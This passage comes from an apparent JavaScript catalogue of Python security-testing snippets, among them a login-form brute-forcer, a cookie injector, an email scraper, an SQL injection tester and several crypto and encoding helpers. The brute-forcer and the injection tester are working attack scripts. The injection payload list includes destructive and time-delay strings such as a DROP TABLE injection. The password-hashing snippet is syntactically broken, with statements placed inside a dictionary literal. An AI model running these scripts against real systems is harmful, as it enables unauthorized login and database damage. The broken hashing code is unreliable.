    enumerate_subdomains(domain, wordlist)`
  },
  {
    name: "Form Brute-Forcer",
    desc: "Brute-force login forms by testing username/password combinations with session handling.",
    code: `import requests
import sys
import itertools

def brute_force_form(url, usernames, passwords, username_field="username",
                     password_field="password", failure_indicator="Invalid",
                     extra_data=None):
    session = requests.Session()
    # Fetch the login page first to get any CSRF tokens or cookies
    try:
        session.get(url, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not reach {url}: {e}")
        return None

    attempts = 0
    total = len(usernames) * len(passwords)
    print(f"[*] Starting brute-force: {total} combinations")

    for username, password in itertools.product(usernames, passwords):
        attempts += 1
        data = {username_field: username, password_field: password}
        if extra_data:
            data.update(extra_data)

        try:
            resp = session.post(url, data=data, timeout=10, allow_redirects=True)
            if failure_indicator not in resp.text:
                print(f"\\n[+] FOUND! Username: {username} Password: {password}")
                print(f"    Status: {resp.status_code}")
                print(f"    URL: {resp.url}")
                return {"username": username, "password": password}
            else:
                sys.stdout.write(f"\\r[*] Trying {attempts}/{total}: {username}:{password}    ")
                sys.stdout.flush()
        except requests.exceptions.RequestException:
            continue

    print(f"\\n[-] Brute-force complete. No valid credentials found.")
    return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/login"
    users = ["admin", "root", "user", "test", "administrator"]
    passes = ["password", "123456", "admin", "root", "letmein", "changeme"]
    brute_force_form(url, users, passes)`
  },
  {
    name: "Cookie and Session Handling",
    desc: "Demonstrate cookie extraction, session persistence, and cookie manipulation for web testing.",
    code: `import requests
import json
from http.cookiejar import MozillaCookieJar

def analyze_cookies(url):
    session = requests.Session()
    resp = session.get(url, timeout=10)
    print(f"[*] Cookies from {url}:")
    for cookie in session.cookies:
        print(f"  Name:     {cookie.name}")
        print(f"  Value:    {cookie.value}")
        print(f"  Domain:   {cookie.domain}")
        print(f"  Path:     {cookie.path}")
        print(f"  Secure:   {cookie.secure}")
        print(f"  HttpOnly: {cookie.has_nonstandard_attr('httponly')}")
        print(f"  Expires:  {cookie.expires}")
        print()
    return session

def inject_cookies(url, cookies_dict):
    session = requests.Session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value)
    resp = session.get(url, timeout=10)
    print(f"[*] Response with injected cookies: {resp.status_code}")
    return resp

def save_load_cookies(session, filepath):
    jar = MozillaCookieJar(filepath)
    for cookie in session.cookies:
        jar.set_cookie(cookie)
    jar.save(ignore_discard=True, ignore_expires=True)
    print(f"[*] Cookies saved to {filepath}")

    new_session = requests.Session()
    jar2 = MozillaCookieJar(filepath)
    jar2.load(ignore_discard=True, ignore_expires=True)
    new_session.cookies = jar2
    print(f"[*] Cookies loaded from {filepath}")
    return new_session

if __name__ == "__main__":
    url = "https://httpbin.org/cookies/set?session_id=abc123&user=admin"
    session = analyze_cookies(url)
    inject_cookies("https://httpbin.org/cookies", {"auth_token": "test_value"})`
  },
  {
    name: "Web Scraper for Emails and Links",
    desc: "Scrape web pages to extract email addresses, hyperlinks, and form actions.",
    code: `import requests
import re
from html.parser import HTMLParser
from urllib.parse import urljoin, urlparse
import sys

class LinkParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.links = set()
        self.forms = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "a" and "href" in attrs_dict:
            href = urljoin(self.base_url, attrs_dict["href"])
            self.links.add(href)
        elif tag == "form":
            self._current_form = {
                "action": urljoin(self.base_url, attrs_dict.get("action", "")),
                "method": attrs_dict.get("method", "GET").upper(),
                "inputs": []
            }
        elif tag == "input" and self._current_form is not None:
            self._current_form["inputs"].append({
                "name": attrs_dict.get("name", ""),
                "type": attrs_dict.get("type", "text"),
                "value": attrs_dict.get("value", "")
            })

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form:
            self.forms.append(self._current_form)
            self._current_form = None

def scrape_page(url, depth=0, max_depth=1, visited=None):
    if visited is None:
        visited = set()
    if url in visited or depth > max_depth:
        return {"emails": set(), "links": set(), "forms": []}
    visited.add(url)

    results = {"emails": set(), "links": set(), "forms": []}
    try:
        resp = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        text = resp.text
        # Extract emails
        emails = set(re.findall(r"[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}", text))
        results["emails"].update(emails)
        # Parse links and forms
        parser = LinkParser(url)
        parser.feed(text)
        results["links"].update(parser.links)
        results["forms"].extend(parser.forms)

        if emails:
            print(f"\\n[+] Emails found on {url}:")
            for email in emails:
                print(f"    {email}")
        print(f"[*] {url}: {len(parser.links)} links, {len(parser.forms)} forms, {len(emails)} emails")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error scraping {url}: {e}")
    return results

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    results = scrape_page(url)
    print(f"\\n--- Summary ---")
    print(f"Emails: {len(results['emails'])}")
    print(f"Links:  {len(results['links'])}")
    print(f"Forms:  {len(results['forms'])}")`
  },
  {
    name: "HTTP Header Analyzer",
    desc: "Analyze HTTP response headers for security misconfigurations and missing protections.",
    code: `import requests
import sys

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "desc": "Enforces HTTPS connections",
        "severity": "HIGH"
    },
    "Content-Security-Policy": {
        "desc": "Prevents XSS and injection attacks",
        "severity": "HIGH"
    },
    "X-Content-Type-Options": {
        "desc": "Prevents MIME-type sniffing",
        "severity": "MEDIUM"
    },
    "X-Frame-Options": {
        "desc": "Prevents clickjacking attacks",
        "severity": "MEDIUM"
    },
    "X-XSS-Protection": {
        "desc": "Enables browser XSS filter",
        "severity": "LOW"
    },
    "Referrer-Policy": {
        "desc": "Controls referrer information leakage",
        "severity": "LOW"
    },
    "Permissions-Policy": {
        "desc": "Controls browser feature access",
        "severity": "MEDIUM"
    },
    "Cross-Origin-Embedder-Policy": {
        "desc": "Controls cross-origin resource embedding",
        "severity": "LOW"
    },
    "Cross-Origin-Opener-Policy": {
        "desc": "Isolates browsing context",
        "severity": "LOW"
    },
    "Cross-Origin-Resource-Policy": {
        "desc": "Controls cross-origin resource sharing",
        "severity": "LOW"
    }
}

def analyze_headers(url):
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return

    print(f"[*] Header Analysis for {url}")
    print(f"    Status: {resp.status_code}")
    print(f"    Server: {resp.headers.get('Server', 'Not disclosed')}")
    print(f"    Powered-By: {resp.headers.get('X-Powered-By', 'Not disclosed')}")

    print(f"\\n--- Security Headers ---")
    missing = []
    present = []
    for header, info in SECURITY_HEADERS.items():
        value = resp.headers.get(header)
        if value:
            present.append((header, value, info))
            print(f"  [OK] {header}: {value}")
        else:
            missing.append((header, info))
            print(f"  [!!] {header}: MISSING ({info['severity']}) - {info['desc']}")

    # Check for information leakage headers
    print(f"\\n--- Information Leakage ---")
    leaky = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
    for h in leaky:
        val = resp.headers.get(h)
        if val:
            print(f"  [WARN] {h}: {val}")

    print(f"\\n--- Score ---")
    score = len(present) / len(SECURITY_HEADERS) * 100
    print(f"  {len(present)}/{len(SECURITY_HEADERS)} security headers present ({score:.0f}%)")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    analyze_headers(url)`
  },
  {
    name: "SQL Injection Tester",
    desc: "Test URL parameters and form inputs for common SQL injection vulnerabilities.",
    code: `import requests
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"ORA-[0-9]{5}",
    r"Oracle error",
    r"Microsoft OLE DB Provider for SQL Server",
    r"\\[Microsoft\\]\\[ODBC SQL Server Driver\\]",
    r"Unclosed quotation mark",
    r"Microsoft SQL Native Client error",
    r"SQLite.*error",
    r"sqlite3\\.OperationalError",
    r"SQLITE_ERROR",
    r"unrecognized token",
]

def test_sqli(url, method="GET", data=None):
    print(f"[*] Testing SQL injection on {url}")
    vulnerabilities = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if method.upper() == "GET" and params:
        for param_name in params:
            print(f"\\n[*] Testing parameter: {param_name}")
            for payload in SQL_PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=test_query))
                try:
                    resp = requests.get(test_url, timeout=10)
                    for pattern in SQL_ERRORS:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            vuln = {
                                "param": param_name,
                                "payload": payload,
                                "error_pattern": pattern,
                                "status": resp.status_code
                            }
                            vulnerabilities.append(vuln)
                            print(f"  [+] VULNERABLE! Param={param_name} Payload={payload}")
                            break
                except requests.exceptions.RequestException:
                    continue

    elif method.upper() == "POST" and data:
        for param_name in data:
            print(f"\\n[*] Testing POST parameter: {param_name}")
            for payload in SQL_PAYLOADS:
                test_data = dict(data)
                test_data[param_name] = payload
                try:
                    resp = requests.post(url, data=test_data, timeout=10)
                    for pattern in SQL_ERRORS:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            vuln = {
                                "param": param_name,
                                "payload": payload,
                                "error_pattern": pattern
                            }
                            vulnerabilities.append(vuln)
                            print(f"  [+] VULNERABLE! Param={param_name} Payload={payload}")
                            break
                except requests.exceptions.RequestException:
                    continue

    print(f"\\n[*] Scan complete. Found {len(vulnerabilities)} potential vulnerabilities.")
    return vulnerabilities

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/page?id=1"
    test_sqli(url)`
  },

  // ============================================================
  // CRYPTO
  // ============================================================
  {
    name: "AES Encryption/Decryption",
    desc: "Encrypt and decrypt data using AES-256-CBC with PKCS7 padding via the cryptography library.",
    code: `from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import os
import base64

def aes_encrypt(plaintext, key=None):
    if key is None:
        key = os.urandom(32)  # AES-256
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return {
        "ciphertext": base64.b64encode(ciphertext).decode(),
        "iv": base64.b64encode(iv).decode(),
        "key": base64.b64encode(key).decode()
    }

def aes_decrypt(ciphertext_b64, key_b64, iv_b64):
    ciphertext = base64.b64decode(ciphertext_b64)
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()
    return plaintext.decode()

if __name__ == "__main__":
    message = "This is a secret message for AES encryption testing."
    print(f"Original:  {message}")
    encrypted = aes_encrypt(message)
    print(f"Encrypted: {encrypted['ciphertext']}")
    print(f"IV:        {encrypted['iv']}")
    print(f"Key:       {encrypted['key']}")
    decrypted = aes_decrypt(encrypted["ciphertext"], encrypted["key"], encrypted["iv"])
    print(f"Decrypted: {decrypted}")
    assert message == decrypted, "Decryption failed!"
    print("[+] AES-256-CBC encryption/decryption successful")`
  },
  {
    name: "RSA Key Generation",
    desc: "Generate RSA key pairs, export to PEM format, and perform encryption/decryption and signing.",
    code: `from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
import base64

def generate_rsa_keypair(key_size=2048):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    public_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return private_key, public_key, private_pem, public_pem

def rsa_encrypt(public_key, plaintext):
    ciphertext = public_key.encrypt(
        plaintext.encode(),
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(ciphertext).decode()

def rsa_decrypt(private_key, ciphertext_b64):
    ciphertext = base64.b64decode(ciphertext_b64)
    plaintext = private_key.decrypt(
        ciphertext,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext.decode()

def rsa_sign(private_key, message):
    signature = private_key.sign(
        message.encode(),
        asym_padding.PSS(
            mgf=asym_padding.MGF1(hashes.SHA256()),
            salt_length=asym_padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return base64.b64encode(signature).decode()

def rsa_verify(public_key, message, signature_b64):
    signature = base64.b64decode(signature_b64)
    try:
        public_key.verify(
            signature,
            message.encode(),
            asym_padding.PSS(
                mgf=asym_padding.MGF1(hashes.SHA256()),
                salt_length=asym_padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False

if __name__ == "__main__":
    priv, pub, priv_pem, pub_pem = generate_rsa_keypair(2048)
    print("[+] RSA-2048 key pair generated")
    print(f"Private key:\\n{priv_pem.decode()[:80]}...")
    print(f"Public key:\\n{pub_pem.decode()[:80]}...")

    message = "Secret RSA message"
    encrypted = rsa_encrypt(pub, message)
    print(f"\\nEncrypted: {encrypted[:60]}...")
    decrypted = rsa_decrypt(priv, encrypted)
    print(f"Decrypted: {decrypted}")

    sig = rsa_sign(priv, message)
    print(f"\\nSignature: {sig[:60]}...")
    valid = rsa_verify(pub, message, sig)
    print(f"Signature valid: {valid}")`
  },
  {
    name: "File Hashing (MD5, SHA1, SHA256)",
    desc: "Compute MD5, SHA-1, and SHA-256 hashes for files and strings, with large file support.",
    code: `import hashlib
import sys
import os

def hash_string(text, algorithms=None):
    if algorithms is None:
        algorithms = ["md5", "sha1", "sha256", "sha512"]
    results = {}
    for algo in algorithms:
        h = hashlib.new(algo)
        h.update(text.encode("utf-8"))
        results[algo] = h.hexdigest()
    return results

def hash_file(filepath, algorithms=None, chunk_size=8192):
    if algorithms is None:
        algorithms = ["md5", "sha1", "sha256"]
    hashers = {algo: hashlib.new(algo) for algo in algorithms}
    file_size = os.path.getsize(filepath)
    bytes_read = 0
    with open(filepath, "rb") as f:
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            bytes_read += len(chunk)
            for h in hashers.values():
                h.update(chunk)
            progress = (bytes_read / file_size) * 100
            sys.stdout.write(f"\\rHashing: {progress:.1f}%")
            sys.stdout.flush()
    print()
    return {algo: h.hexdigest() for algo, h in hashers.items()}

def verify_hash(filepath, expected_hash, algorithm="sha256"):
    result = hash_file(filepath, [algorithm])
    computed = result[algorithm]
    match = computed.lower() == expected_hash.lower()
    print(f"Expected:  {expected_hash}")
    print(f"Computed:  {computed}")
    print(f"Match:     {match}")
    return match

if __name__ == "__main__":
    # Hash a string
    text = "Hello, security world!"
    print(f"String: {text}")
    for algo, digest in hash_string(text).items():
        print(f"  {algo.upper():8s}: {digest}")

    # Hash a file
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
        print(f"\\nFile: {filepath}")
        for algo, digest in hash_file(filepath).items():
            print(f"  {algo.upper():8s}: {digest}")`
  },
  {
    name: "Password Hashing with Hashlib",
    desc: "Securely hash passwords using PBKDF2, scrypt, and salted SHA-256.",
    code: `import hashlib
import os
import binascii
import hmac

def hash_pbkdf2(password, salt=None, iterations=600000):
    if salt is None:
        salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations, dklen=32)
    return {
        "hash": binascii.hexlify(key).decode(),
        "salt": binascii.hexlify(salt).decode(),
        "iterations": iterations,
        salt_hex = binascii.hexlify(salt).decode()
        key_hex = binascii.hexlify(key).decode()
        sep = "$"
        "stored": f"pbkdf2:sha256:{iterations}{sep}{salt_hex}{sep}{key_hex}"
    }

def verify_pbkdf2(password, stored_hash):
    parts = stored_hash.split("$")
    meta = parts[0].split(":")
    iterations = int(meta[2])
    salt = binascii.unhexlify(parts[1])
    expected = parts[2]
    key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations, dklen=32)
    computed = binascii.hexlify(key).decode()
    return hmac.compare_digest(computed, expected)

def hash_scrypt(password, salt=None, n=16384, r=8, p=1):
    if salt is None:
        salt = os.urandom(32)
    key = hashlib.scrypt(password.encode(), salt=salt, n=n, r=r, p=p, dklen=64)
    return {
        "hash": binascii.hexlify(key).decode(),
        "salt": binascii.hexlify(salt).decode(),
        "params": f"n={n},r={r},p={p}"
    }

def hash_salted_sha256(password, salt=None):
    if salt is None:
        salt = os.urandom(16)
    salted = salt + password.encode()
    digest = hashlib.sha256(salted).hexdigest()
    return {
        "hash": digest,
        "salt": binascii.hexlify(salt).decode()
    }

if __name__ == "__main__":
    password = "S3cur3P@ssw0rd!"
    print(f"Password: {password}")

    result = hash_pbkdf2(password)
    print(f"\\n[PBKDF2-SHA256]")
    print(f"  Stored: {result['stored']}")
    valid = verify_pbkdf2(password, result["stored"])
    print(f"  Verify: {valid}")

    result = hash_scrypt(password)
    print(f"\\n[scrypt]")
    print(f"  Hash: {result['hash'][:64]}...")
    print(f"  Salt: {result['salt']}")

    result = hash_salted_sha256(password)
    print(f"\\n[Salted SHA-256]")
    print(f"  Hash: {result['hash']}")
    print(f"  Salt: {result['salt']}")`
  },
  {
    name: "XOR Cipher",
    desc: "Implement XOR cipher for encryption/decryption with single-byte and multi-byte keys.",
    code: `import os

def xor_single_byte(data, key_byte):
    return bytes([b ^ key_byte for b in data])

def xor_multi_byte(data, key):
    if isinstance(key, str):
        key = key.encode()
    if isinstance(data, str):
        data = data.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def xor_encrypt(plaintext, key):
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()
    if isinstance(key, str):
        key = key.encode()
    ciphertext = xor_multi_byte(plaintext, key)
    return ciphertext.hex()

def xor_decrypt(ciphertext_hex, key):
    ciphertext = bytes.fromhex(ciphertext_hex)
    if isinstance(key, str):
        key = key.encode()
    plaintext = xor_multi_byte(ciphertext, key)
    return plaintext.decode("utf-8", errors="replace")

def brute_force_single_byte_xor(ciphertext):
    results = []
    for key in range(256):
        decrypted = xor_single_byte(ciphertext, key)
        try:
            text = decrypted.decode("ascii")
            # Score based on printable ASCII frequency
            score = sum(1 for c in text if c.isalpha() or c == " ")
            results.append((key, score, text))
        except UnicodeDecodeError:
            continue
    results.sort(key=lambda x: x[1], reverse=True)
    return results[:5]

def find_xor_key_length(ciphertext, max_len=20):
    distances = []
    for klen in range(2, max_len + 1):
        blocks = [ciphertext[i:i+klen] for i in range(0, len(ciphertext), klen)]
        if len(blocks) < 4:
            continue
        total = 0
        count = 0
        for i in range(min(len(blocks) - 1, 6)):
            for j in range(i + 1, min(len(blocks), 6)):
                minlen = min(len(blocks[i]), len(blocks[j]))
                hamming = sum(bin(a ^ b).count("1") for a, b in zip(blocks[i][:minlen], blocks[j][:minlen]))
                total += hamming / minlen
                count += 1
        normalized = total / count / klen if count else float("inf")
        distances.append((klen, normalized))
    distances.sort(key=lambda x: x[1])
    return distances[:5]

if __name__ == "__main__":
    message = "XOR cipher demonstration for security testing"
    key = "s3cr3t"
    encrypted = xor_encrypt(message, key)
    print(f"Original:  {message}")
    print(f"Key:       {key}")
    print(f"Encrypted: {encrypted}")
    decrypted = xor_decrypt(encrypted, key)
    print(f"Decrypted: {decrypted}")

    # Single-byte brute force demo
    print("\\n--- Single-byte XOR brute force ---")
    ct = xor_single_byte(b"Attack at dawn", 0x4B)
    top = brute_force_single_byte_xor(ct)
    for k, score, text in top:
        print(f"  Key=0x{k:02x} Score={score:3d} Text={text}")`
  },
  {
    name: "Base64 Encode/Decode Utility",
    desc: "Encode and decode data in Base64, Base32, Base16, and URL-safe Base64 variants.",
    code: `import base64
import sys

def encode_all(data):
    if isinstance(data, str):
        data = data.encode()
    return {
        "base64": base64.b64encode(data).decode(),
        "base64_urlsafe": base64.urlsafe_b64encode(data).decode(),
        "base32": base64.b32encode(data).decode(),
        "base16": base64.b16encode(data).decode(),
        "base85": base64.b85encode(data).decode(),
    }

def decode_base64(encoded, urlsafe=False):
    try:
        # Add padding if needed
        padding = 4 - (len(encoded) % 4)
        if padding != 4:
            encoded += "=" * padding
        if urlsafe:
            decoded = base64.urlsafe_b64decode(encoded)
        else:
            decoded = base64.b64decode(encoded)
        try:
            return decoded.decode("utf-8")
        except UnicodeDecodeError:
            return decoded.hex()
    except Exception as e:
        return f"Decode error: {e}"

def detect_encoding(data):
    import re
    checks = [
        ("base64", r"^[A-Za-z0-9+/]+=*$"),
        ("base64_urlsafe", r"^[A-Za-z0-9_-]+=*$"),
        ("base32", r"^[A-Z2-7]+=*$"),
        ("base16", r"^[0-9A-Fa-f]+$"),
    ]
    possible = []
    for name, pattern in checks:
        if re.match(pattern, data):
            possible.append(name)
    return possible

def file_to_base64(filepath):
    with open(filepath, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data).decode()
    print(f"File: {filepath}")
    print(f"Size: {len(data)} bytes")
    print(f"Base64 length: {len(encoded)} chars")
    return encoded

if __name__ == "__main__":
    text = sys.argv[1] if len(sys.argv) > 1 else "Security testing payload"
    print(f"Input: {text}\\n")
    results = encode_all(text)
    for name, encoded in results.items():
        print(f"  {name:18s}: {encoded}")
    print(f"\\nDecoded base64: {decode_base64(results['base64'])}")
    print(f"Possible encodings of base64 output: {detect_encoding(results['base64'])}")`
  },
  {
    name: "JWT Decoder",
    desc: "Decode and analyze JSON Web Tokens without verification, inspecting header, payload, and claims.",
    code: `import base64
import json
import sys
import time

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")

    def decode_part(part):
        padding = 4 - (len(part) % 4)
        if padding != 4:
            part += "=" * padding
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)

    header = decode_part(parts[0])
    payload = decode_part(parts[1])
    signature = parts[2]

    return {
        "header": header,
        "payload": payload,
        "signature": signature,
        "raw_parts": parts
    }

def analyze_jwt(token):
    decoded = decode_jwt(token)
    header = decoded["header"]
    payload = decoded["payload"]

    print("=== JWT Analysis ===\\n")
    print("[Header]")
    print(json.dumps(header, indent=2))

    print("\\n[Payload]")
    print(json.dumps(payload, indent=2))

    print(f"\\n[Signature]")
    print(f"  Raw: {decoded['signature'][:50]}...")

    print(f"\\n[Security Analysis]")
    alg = header.get("alg", "unknown")
    print(f"  Algorithm: {alg}")
    if alg == "none":
        print("  [!!] CRITICAL: Algorithm is 'none' -- token is unsigned!")
    elif alg in ("HS256", "HS384", "HS512"):
        print(f"  [INFO] Symmetric algorithm ({alg}) -- shared secret required")
    elif alg in ("RS256", "RS384", "RS512"):
        print(f"  [INFO] Asymmetric algorithm ({alg}) -- RSA key pair required")
    elif alg in ("ES256", "ES384", "ES512"):
        print(f"  [INFO] ECDSA algorithm ({alg})")

    now = int(time.time())
    if "exp" in payload:
        exp = payload["exp"]
        if exp < now:
            print(f"  [!!] Token EXPIRED at {time.ctime(exp)}")
        else:
            remaining = exp - now
            print(f"  [OK] Expires at {time.ctime(exp)} ({remaining}s remaining)")

    if "iat" in payload:
        print(f"  [INFO] Issued at {time.ctime(payload['iat'])}")
    if "nbf" in payload:
        nbf = payload["nbf"]
        if nbf > now:
            print(f"  [WARN] Not valid before {time.ctime(nbf)}")

    if "sub" in payload:
        print(f"  [INFO] Subject: {payload['sub']}")
    if "iss" in payload:
        print(f"  [INFO] Issuer: {payload['iss']}")
    if "aud" in payload:
        print(f"  [INFO] Audience: {payload['aud']}")

    return decoded

if __name__ == "__main__":
    # Example JWT (expired, for testing only)
    test_jwt = (
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MjM5OTIyLCJpc3MiOiJ0ZXN0LWlzc3VlciJ9."
        "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    )
    token = sys.argv[1] if len(sys.argv) > 1 else test_jwt
    analyze_jwt(token)`
  },
  {
    name: "Certificate Parser",
    desc: "Parse and analyze X.509 certificates from PEM files, extracting subject, issuer, dates, and extensions.",
    code: `from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID, ExtensionOID
import ssl
import socket
import sys
import datetime

def parse_cert_file(filepath):
    with open(filepath, "rb") as f:
        pem_data = f.read()
    cert = x509.load_pem_x509_certificate(pem_data, default_backend())
    return analyze_cert(cert)

def fetch_cert(hostname, port=443):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((hostname, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
            der = ssock.getpeercert(binary_form=True)
    cert = x509.load_der_x509_certificate(der, default_backend())
    return analyze_cert(cert)

def analyze_cert(cert):
    info = {}
    def name_to_dict(name):
        result = {}
        for attr in name:
            oid_name = attr.oid._name
            result[oid_name] = attr.value
        return result

    info["subject"] = name_to_dict(cert.subject)
    info["issuer"] = name_to_dict(cert.issuer)
    info["serial"] = cert.serial_number
    info["not_before"] = cert.not_valid_before_utc
    info["not_after"] = cert.not_valid_after_utc
    info["version"] = cert.version.name
    info["sig_algorithm"] = cert.signature_algorithm_oid._name

    now = datetime.datetime.now(datetime.timezone.utc)
    info["expired"] = now > cert.not_valid_after_utc
    info["not_yet_valid"] = now < cert.not_valid_before_utc
    days_left = (cert.not_valid_after_utc - now).days
    info["days_remaining"] = days_left

    # Extensions
    san_names = []
    try:
        san = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        san_names = san.value.get_values_for_type(x509.DNSName)
    except x509.ExtensionNotFound:
        pass
    info["san"] = san_names

    try:
        basic = cert.extensions.get_extension_for_oid(ExtensionOID.BASIC_CONSTRAINTS)
        info["is_ca"] = basic.value.ca
    except x509.ExtensionNotFound:
        info["is_ca"] = False

    # Print report
    print("=== Certificate Analysis ===")
    print(f"\\n[Subject]")
    for k, v in info["subject"].items():
        print(f"  {k}: {v}")
    print(f"\\n[Issuer]")
    for k, v in info["issuer"].items():
        print(f"  {k}: {v}")
    print(f"\\n[Validity]")
    print(f"  Not Before: {info['not_before']}")
    print(f"  Not After:  {info['not_after']}")
    print(f"  Days Left:  {info['days_remaining']}")
    if info["expired"]:
        print(f"  [!!] CERTIFICATE IS EXPIRED")
    if info["not_yet_valid"]:
        print(f"  [!!] CERTIFICATE NOT YET VALID")
    print(f"\\n[Details]")
    print(f"  Serial:    {info['serial']}")
    print(f"  Version:   {info['version']}")
    print(f"  Algorithm: {info['sig_algorithm']}")
    print(f"  Is CA:     {info['is_ca']}")
    if san_names:
        print(f"\\n[Subject Alternative Names]")
        for name in san_names:
            print(f"  {name}")
    return info

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "google.com"
    if target.endswith(".pem") or target.endswith(".crt"):
        parse_cert_file(target)
    else:
        print(f"[*] Fetching certificate from {target}:443")
        fetch_cert(target)`
  },

  // ============================================================
  // ENCODING
  // ============================================================
  {
    name: "URL Encode/Decode",
    desc: "URL-encode and decode strings, with support for full URL parsing and component encoding.",
    code: `from urllib.parse import quote, unquote, quote_plus, unquote_plus
from urllib.parse import urlparse, urlencode, parse_qs
import sys

def url_encode(text, plus=False):
    if plus:
        return quote_plus(text)
    return quote(text, safe="")

def url_decode(text, plus=False):
    if plus:
        return unquote_plus(text)
    return unquote(text)

def double_encode(text):
    first = quote(text, safe="")
    second = quote(first, safe="")
    return second

def parse_url_components(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    print(f"URL: {url}")
    print(f"  Scheme:   {parsed.scheme}")
    print(f"  Netloc:   {parsed.netloc}")
    print(f"  Path:     {parsed.path}")
    print(f"  Query:    {parsed.query}")
    print(f"  Fragment: {parsed.fragment}")
    print(f"  Params:")
    for k, v in params.items():
        print(f"    {k} = {v}")
    return parsed, params

def encode_special_chars():
    specials = {
        "Space":        " ",
        "Ampersand":    "&",
        "Equals":       "=",
        "Question":     "?",
        "Hash":         "#",
        "Slash":        "/",
        "Plus":         "+",
        "Percent":      "%",
        "Single Quote": "'",
        "Double Quote": '"',
        "Angle Left":   "<",
        "Angle Right":  ">",
